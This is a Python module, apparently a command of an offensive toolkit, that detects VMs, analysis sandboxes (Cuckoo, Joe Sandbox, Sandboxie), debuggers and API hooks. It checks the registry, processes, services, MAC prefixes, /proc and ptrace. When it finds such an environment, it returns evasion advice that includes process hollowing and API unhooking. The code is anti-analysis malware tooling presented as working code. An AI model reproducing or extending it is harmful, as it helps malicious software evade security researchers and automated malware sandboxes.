#!/usr/bin/env python3
"""
Elite VMScan Command Implementation - NO SUBPROCESS
Advanced VM/sandbox detection using native APIs only
"""

import os
import sys
import ctypes
from ctypes import wintypes
import winreg
import time
from typing import Dict, Any, List
import socket
import struct

# Import our native API wrapper
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from api_wrappers import get_native_api

def elite_vmscan(deep_scan: bool = True, evasion_check: bool = True) -> Dict[str, Any]:
    """
    Elite VM/sandbox detection using ONLY native APIs - NO SUBPROCESS
    """
    
    try:
        scan_results = {
            "is_vm": False,
            "is_sandbox": False,
            "confidence": 0,
            "vm_type": None,
            "sandbox_type": None,
            "indicators": [],
            "hardware_analysis": {},
            "behavioral_analysis": {},
            "evasion_recommendations": []
        }
        
        # Platform-specific detection
        if sys.platform == 'win32':
            _windows_vm_detection(scan_results, deep_scan)
            if evasion_check:
                _windows_sandbox_detection(scan_results)
        else:
            _unix_vm_detection(scan_results, deep_scan)
            if evasion_check:
                _unix_sandbox_detection(scan_results)
        
        # Calculate confidence score
        scan_results["confidence"] = len(scan_results["indicators"]) * 10
        if scan_results["confidence"] > 100:
            scan_results["confidence"] = 100
        
        # Determine if VM/sandbox based on indicators
        if scan_results["confidence"] >= 50:
            scan_results["is_vm"] = True
        if scan_results["confidence"] >= 70:
            scan_results["is_sandbox"] = True
        
        # Add evasion recommendations if detected
        if scan_results["is_vm"] or scan_results["is_sandbox"]:
            scan_results["evasion_recommendations"] = _get_evasion_recommendations()
        
        return scan_results
        
    except Exception as e:
        return {
            "success": False,
            "error": f"VM scan failed: {str(e)}"
        }

def _windows_vm_detection(scan_results: Dict[str, Any], deep_scan: bool):
    """Windows VM detection using native APIs only"""
    
    # 1. Check Registry for VM artifacts
    _check_registry_artifacts(scan_results)
    
    # 2. Check hardware via WMI (native)
    _check_hardware_native(scan_results)
    
    # 3. Check running processes/services
    _check_vm_processes_native(scan_results)
    
    # 4. Check CPUID instruction
    if deep_scan:
        _check_cpuid(scan_results)
    
    # 5. Check timing attacks
    if deep_scan:
        _check_timing_attacks(scan_results)
    
    # 6. Check device drivers
    _check_device_drivers_native(scan_results)

def _check_registry_artifacts(scan_results: Dict[str, Any]):
    """Check registry for VM indicators"""
    
    try:
        # VMware registry keys
        vmware_keys = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VMTools"),
            (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", "Identifier", "VMWARE"),
        ]
        
        for key_info in vmware_keys:
            try:
                if len(key_info) == 2:
                    hkey, subkey = key_info
                    key = winreg.OpenKey(hkey, subkey)
                    winreg.CloseKey(key)
                    scan_results["indicators"].append(f"VMware registry key: {subkey}")
                    scan_results["vm_type"] = "VMware"
                else:
                    hkey, subkey, value_name, expected = key_info
                    key = winreg.OpenKey(hkey, subkey)
                    value, _ = winreg.QueryValueEx(key, value_name)
                    if expected.lower() in str(value).lower():
                        scan_results["indicators"].append(f"VMware identifier in registry")
                        scan_results["vm_type"] = "VMware"
                    winreg.CloseKey(key)
            except:
                pass
        
        # VirtualBox registry keys
        vbox_keys = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
            (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System", "SystemBiosVersion", "VBOX"),
        ]
        
        for key_info in vbox_keys:
            try:
                if len(key_info) == 2:
                    hkey, subkey = key_info
                    key = winreg.OpenKey(hkey, subkey)
                    winreg.CloseKey(key)
                    scan_results["indicators"].append(f"VirtualBox registry key: {subkey}")
                    scan_results["vm_type"] = "VirtualBox"
                else:
                    hkey, subkey, value_name, expected = key_info
                    key = winreg.OpenKey(hkey, subkey)
                    value, _ = winreg.QueryValueEx(key, value_name)
                    if expected.lower() in str(value).lower():
                        scan_results["indicators"].append(f"VirtualBox identifier in registry")
                        scan_results["vm_type"] = "VirtualBox"
                    winreg.CloseKey(key)
            except:
                pass
        
        # Hyper-V registry keys
        hyperv_keys = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Hyper-V"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\VirtualMachine"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmicheartbeat"),
        ]
        
        for hkey, subkey in hyperv_keys:
            try:
                key = winreg.OpenKey(hkey, subkey)
                winreg.CloseKey(key)
                scan_results["indicators"].append(f"Hyper-V registry key: {subkey}")
                scan_results["vm_type"] = "Hyper-V"
            except:
                pass
                
    except Exception:
        pass

def _check_hardware_native(scan_results: Dict[str, Any]):
    """Check hardware characteristics using native APIs"""
    
    try:
        # Get system info using Windows API
        kernel32 = ctypes.windll.kernel32
        
        class SYSTEM_INFO(ctypes.Structure):
            _fields_ = [
                ("wProcessorArchitecture", wintypes.WORD),
                ("wReserved", wintypes.WORD),
                ("dwPageSize", wintypes.DWORD),
                ("lpMinimumApplicationAddress", wintypes.LPVOID),
                ("lpMaximumApplicationAddress", wintypes.LPVOID),
                ("dwActiveProcessorMask", ctypes.POINTER(wintypes.DWORD)),
                ("dwNumberOfProcessors", wintypes.DWORD),
                ("dwProcessorType", wintypes.DWORD),
                ("dwAllocationGranularity", wintypes.DWORD),
                ("wProcessorLevel", wintypes.WORD),
                ("wProcessorRevision", wintypes.WORD)
            ]
        
        sys_info = SYSTEM_INFO()
        kernel32.GetSystemInfo(ctypes.byref(sys_info))
        
        # Check CPU count (VMs often have 1-2 CPUs)
        if sys_info.dwNumberOfProcessors <= 2:
            scan_results["indicators"].append(f"Low CPU count: {sys_info.dwNumberOfProcessors}")
            scan_results["hardware_analysis"]["cpu_count"] = sys_info.dwNumberOfProcessors
        
        # Get memory info
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", wintypes.DWORD),
                ("dwMemoryLoad", wintypes.DWORD),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("ullAvailExtendedVirtual", ctypes.c_ulonglong)
            ]
        
        mem_status = MEMORYSTATUSEX()
        mem_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        kernel32.GlobalMemoryStatusEx(ctypes.byref(mem_status))
        
        # Check RAM (VMs often have < 4GB)
        ram_gb = mem_status.ullTotalPhys / (1024**3)
        if ram_gb < 4:
            scan_results["indicators"].append(f"Low RAM: {ram_gb:.1f}GB")
            scan_results["hardware_analysis"]["ram_gb"] = ram_gb
        
        # Check MAC address for VM OUIs
        _check_mac_address(scan_results)
        
    except Exception:
        pass

def _check_vm_processes_native(scan_results: Dict[str, Any]):
    """Check for VM-related processes using native API"""
    
    try:
        api = get_native_api()
        processes = api.list_processes()
        
        # VM process indicators
        vm_processes = {
            'vmware': ['vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe', 'vmware.exe'],
            'virtualbox': ['vboxservice.exe', 'vboxtray.exe', 'vboxguest.exe'],
            'hyperv': ['vmicheartbeat.exe', 'vmicrdv.exe', 'vmicshutdown.exe', 'vmicvss.exe'],
            'qemu': ['qemu-ga.exe', 'qemu.exe'],
            'xen': ['xenservice.exe', 'xenguestagent.exe'],
            'parallels': ['prl_tools.exe', 'prl_cc.exe'],
            'sandbox': ['sbiesvc.exe', 'sbiedll.exe', 'aswhook.dll']
        }
        
        process_names = [p['name'].lower() for p in processes]
        
        for vm_type, indicators in vm_processes.items():
            for indicator in indicators:
                if indicator.lower() in process_names:
                    scan_results["indicators"].append(f"VM process detected: {indicator}")
                    if vm_type != 'sandbox':
                        scan_results["vm_type"] = vm_type.capitalize()
                    else:
                        scan_results["sandbox_type"] = "Sandboxie"
        
        # Check services using native API
        _check_vm_services_native(scan_results)
        
    except Exception:
        pass

def _check_vm_services_native(scan_results: Dict[str, Any]):
    """Check for VM services using native API"""
    
    try:
        advapi32 = ctypes.windll.advapi32
        
        # Open service control manager
        scm = advapi32.OpenSCManagerW(None, None, 0x0004)  # SC_MANAGER_ENUMERATE_SERVICE
        
        if scm:
            # VM service names
            vm_services = [
                ('VMTools', 'VMware'),
                ('VBoxService', 'VirtualBox'),
                ('vmicheartbeat', 'Hyper-V'),
                ('vmicshutdown', 'Hyper-V'),
                ('xenservice', 'Xen'),
                ('prl_tools', 'Parallels')
            ]
            
            for service_name, vm_type in vm_services:
                # Try to open each service
                service = advapi32.OpenServiceW(
                    scm, 
                    service_name, 
                    0x0001  # SERVICE_QUERY_STATUS
                )
                
                if service:
                    scan_results["indicators"].append(f"VM service found: {service_name}")
                    scan_results["vm_type"] = vm_type
                    advapi32.CloseServiceHandle(service)
            
            advapi32.CloseServiceHandle(scm)
            
    except Exception:
        pass

def _check_cpuid(scan_results: Dict[str, Any]):
    """Check CPUID for hypervisor bit"""
    
    try:
        # Check if running under hypervisor using CPUID
        # This requires inline assembly or a compiled extension
        # For pure Python, we check alternative indicators
        
        # Check if RDTSC instruction shows timing anomalies
        import time
        
        # Measure TSC timing
        measurements = []
        for _ in range(10):
            start = time.perf_counter_ns()
            # Perform a simple operation
            _ = [i for i in range(100)]
            end = time.perf_counter_ns()
            measurements.append(end - start)
        
        # Check for timing anomalies common in VMs
        avg_time = sum(measurements) / len(measurements)
        variance = sum((m - avg_time) ** 2 for m in measurements) / len(measurements)
        
        # VMs often have high variance in timing
        if variance > avg_time * 0.5:
            scan_results["indicators"].append("High timing variance detected")
            scan_results["behavioral_analysis"]["timing_anomaly"] = True
            
    except Exception:
        pass

def _check_timing_attacks(scan_results: Dict[str, Any]):
    """Perform timing attacks to detect VM"""
    
    try:
        import time
        
        # Check RDTSC timing
        def rdtsc_check():
            measurements = []
            for _ in range(100):
                start = time.perf_counter_ns()
                # NOP operation
                pass
                end = time.perf_counter_ns()
                measurements.append(end - start)
            return measurements
        
        measurements = rdtsc_check()
        avg = sum(measurements) / len(measurements)
        
        # VMs typically have higher overhead
        if avg > 1000:  # nanoseconds
            scan_results["indicators"].append("RDTSC timing anomaly")
            scan_results["behavioral_analysis"]["rdtsc_overhead"] = avg
            
    except Exception:
        pass

def _check_device_drivers_native(scan_results: Dict[str, Any]):
    """Check device drivers for VM indicators"""
    
    try:
        # Check display adapter
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000"
            )
            driver_desc, _ = winreg.QueryValueEx(key, "DriverDesc")
            winreg.CloseKey(key)
            
            vm_display_drivers = ['vmware', 'virtualbox', 'vbox', 'qemu', 'microsoft basic display']
            for vm_driver in vm_display_drivers:
                if vm_driver in driver_desc.lower():
                    scan_results["indicators"].append(f"VM display driver: {driver_desc}")
                    break
        except:
            pass
        
        # Check disk drivers
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Services\Disk\Enum"
            )
            
            i = 0
            while True:
                try:
                    value_name = str(i)
                    disk_id, _ = winreg.QueryValueEx(key, value_name)
                    
                    vm_disk_ids = ['vmware', 'vbox', 'qemu', 'virtual', 'msft']
                    for vm_id in vm_disk_ids:
                        if vm_id in disk_id.lower():
                            scan_results["indicators"].append(f"VM disk identifier: {disk_id}")
                            break
                    i += 1
                except:
                    break
                    
            winreg.CloseKey(key)
        except:
            pass
            
    except Exception:
        pass

def _check_mac_address(scan_results: Dict[str, Any]):
    """Check MAC address for VM OUIs"""
    
    try:
        import uuid
        
        # Get MAC address
        mac = uuid.getnode()
        mac_str = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
        
        # Known VM MAC prefixes
        vm_mac_prefixes = {
            '00:05:69': 'VMware',
            '00:0C:29': 'VMware',
            '00:1C:14': 'VMware',
            '00:50:56': 'VMware',
            '08:00:27': 'VirtualBox',
            '00:15:5D': 'Hyper-V',
            '00:16:3E': 'Xen',
            '00:1C:42': 'Parallels',
            '52:54:00': 'QEMU/KVM'
        }
        
        mac_prefix = mac_str[:8]
        for prefix, vm_type in vm_mac_prefixes.items():
            if mac_prefix.upper() == prefix:
                scan_results["indicators"].append(f"VM MAC address: {mac_str}")
                scan_results["vm_type"] = vm_type
                break
                
    except Exception:
        pass

def _windows_sandbox_detection(scan_results: Dict[str, Any]):
    """Detect Windows sandboxes"""
    
    try:
        # Check for common sandbox artifacts
        sandbox_files = [
            r'C:\agent\agent.exe',  # Cuckoo
            r'C:\sandbox\starter.exe',  # Generic sandbox
            r'C:\ipf\ipf.exe',  # Joe Sandbox
            r'C:\tools\aswsnx.exe'  # Avast sandbox
        ]
        
        for filepath in sandbox_files:
            if os.path.exists(filepath):
                scan_results["indicators"].append(f"Sandbox file: {filepath}")
                scan_results["sandbox_type"] = "Analysis Sandbox"
        
        # Check for debugger
        kernel32 = ctypes.windll.kernel32
        if kernel32.IsDebuggerPresent():
            scan_results["indicators"].append("Debugger detected")
            scan_results["sandbox_type"] = "Debugger"
        
        # Check for hooks
        _check_api_hooks(scan_results)
        
    except Exception:
        pass

def _check_api_hooks(scan_results: Dict[str, Any]):
    """Check for API hooks common in sandboxes"""
    
    try:
        # Check if common APIs are hooked
        ntdll = ctypes.windll.ntdll
        kernel32 = ctypes.windll.kernel32
        
        # Get address of NtQueryInformationProcess
        addr = kernel32.GetProcAddress(
            kernel32.GetModuleHandleW("ntdll.dll"),
            b"NtQueryInformationProcess"
        )
        
        if addr:
            # Read first bytes
            first_byte = ctypes.c_ubyte.from_address(addr).value
            
            # Check for common hook patterns
            if first_byte == 0xE9:  # JMP instruction
                scan_results["indicators"].append("API hook detected: NtQueryInformationProcess")
                scan_results["sandbox_type"] = "Hooked Environment"
            
    except Exception:
        pass

def _unix_vm_detection(scan_results: Dict[str, Any], deep_scan: bool):
    """Unix/Linux VM detection"""
    
    try:
        # Check DMI information
        dmi_files = [
            '/sys/devices/virtual/dmi/id/sys_vendor',
            '/sys/devices/virtual/dmi/id/product_name',
            '/sys/devices/virtual/dmi/id/bios_vendor'
        ]
        
        for dmi_file in dmi_files:
            if os.path.exists(dmi_file):
                try:
                    with open(dmi_file, 'r') as f:
                        content = f.read().strip().lower()
                        
                        vm_vendors = ['vmware', 'virtualbox', 'qemu', 'xen', 'microsoft', 'kvm', 'parallels']
                        for vendor in vm_vendors:
                            if vendor in content:
                                scan_results["indicators"].append(f"DMI info: {content}")
                                scan_results["vm_type"] = vendor.capitalize()
                                break
                except:
                    pass
        
        # Check CPU info
        if os.path.exists('/proc/cpuinfo'):
            try:
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read().lower()
                    if 'hypervisor' in cpuinfo:
                        scan_results["indicators"].append("Hypervisor flag in cpuinfo")
                    if 'qemu' in cpuinfo:
                        scan_results["vm_type"] = "QEMU/KVM"
            except:
                pass
        
        # Check loaded modules
        if os.path.exists('/proc/modules'):
            try:
                with open('/proc/modules', 'r') as f:
                    modules = f.read().lower()
                    
                    vm_modules = {
                        'vmw_': 'VMware',
                        'vboxguest': 'VirtualBox',
                        'virtio': 'KVM/QEMU',
                        'xen': 'Xen',
                        'hv_': 'Hyper-V'
                    }
                    
                    for module, vm_type in vm_modules.items():
                        if module in modules:
                            scan_results["indicators"].append(f"VM kernel module: {module}")
                            scan_results["vm_type"] = vm_type
                            break
            except:
                pass
                
    except Exception:
        pass

def _unix_sandbox_detection(scan_results: Dict[str, Any]):
    """Unix/Linux sandbox detection"""
    
    try:
        # Check for ptrace
        try:
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            
            # PTRACE_TRACEME = 0
            result = libc.ptrace(0, 0, 0, 0)
            if result == -1:
                scan_results["indicators"].append("ptrace detection")
                scan_results["sandbox_type"] = "Debugger/Tracer"
            else:
                # Detach
                libc.ptrace(7, 0, 0, 0)  # PTRACE_DETACH
        except:
            pass
        
        # Check environment variables
        sandbox_vars = ['SANDBOX', 'CUCKOO', 'ANALYSIS', 'MALWARE']
        for var in sandbox_vars:
            if os.environ.get(var):
                scan_results["indicators"].append(f"Sandbox env var: {var}")
                scan_results["sandbox_type"] = "Analysis Environment"
                
    except Exception:
        pass

def _get_evasion_recommendations() -> List[str]:
    """Get recommendations for VM/sandbox evasion"""
    
    return [
        "Implement anti-debugging techniques",
        "Check for human interaction (mouse movement, keyboard)",
        "Implement time-based evasion (sleep/delay)",
        "Check for realistic hardware configuration",
        "Verify network connectivity to real services",
        "Check for artifacts of real user activity",
        "Implement domain/environment checks",
        "Use process hollowing to hide in legitimate process",
        "Implement API unhooking before sensitive operations",
        "Check for presence of common user files/applications"
    ]